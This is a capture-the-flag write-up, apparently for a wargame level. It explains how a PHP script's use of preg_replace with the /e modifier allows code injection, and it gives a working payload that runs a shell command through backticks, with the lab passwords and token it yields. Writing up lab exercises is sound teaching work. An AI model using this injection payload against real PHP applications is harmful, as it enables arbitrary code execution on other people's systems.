```bash
$ su level06 -> viuaaale9huek52boumoomioc
```

### Vulnerability Assessment

Upon accessing the terminal as `level06`, an executable (`level06`) and a PHP script (`level06.php`) are present. The PHP script uses the `preg_replace` function with the `/e` modifier, which is deprecated due to security concerns:

```php
#!/usr/bin/php
<?php
function y($m) {
	$m = preg_replace("/\\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}

function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\\[x (.*)\\])/e", "y(\\"\\\\2\\")", $a);
	$a = preg_replace("/\\[/", "(", $a);
	$a = preg_replace("/\\]/", ")", $a);
	return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>

```

The critical vulnerability here is the `/e` modifier in `preg_replace`, which allows the replacement string to be evaluated as PHP code. This can lead to arbitrary code execution if exploited correctly.

### Exploit

To exploit this vulnerability, a file is crafted with a payload that will be executed as PHP code due to the `/e` modifier. The payload uses the `$_GET` array to execute a command, in this case, `getflag`. The backticks (```) are used for command execution in PHP. In our case, everything between [x  ] will be executed as PHP command.

The process involves:

1. Creating a file with the payload `[x {$_GET[`getflag`]}]`.
2. Running the PHP script with the created file as an argument.

The execution of the PHP script with this payload would look like:

```bash
$ echo '[x {$_GET[`getflag`]}]' > /tmp/flag
$ ./level06 /tmp/flag
PHP Notice:  Undefined index: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
